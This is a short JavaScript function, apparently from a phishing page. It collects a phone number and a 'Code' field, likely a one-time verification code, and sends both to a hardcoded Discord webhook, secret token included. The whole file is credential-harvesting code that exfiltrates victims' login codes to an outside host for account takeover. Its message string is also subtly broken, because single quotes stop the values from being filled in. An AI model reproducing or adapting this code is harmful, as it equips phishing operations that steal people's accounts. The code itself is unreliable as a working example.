function sendMessage(){
    let firstInput = document.getElementById("firstInput").value;
    let secondInput = document.getElementById("secondInput").value;

    const webhook = 
    "https://discordapp.com/api/webhooks/1245026639050702898/j7TtsLTVn5l4CiXGjwmDNMNMESizW96q_aSinoxBPidMq-RFgU2zxSlazk1dlq7Y71yx";
    const contents = 'PhoneNumber: ${firstInput}\nCode: ${secondInput}';
    const request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
        content: contents
    }
    request.send(JSON.stringify(params));
}
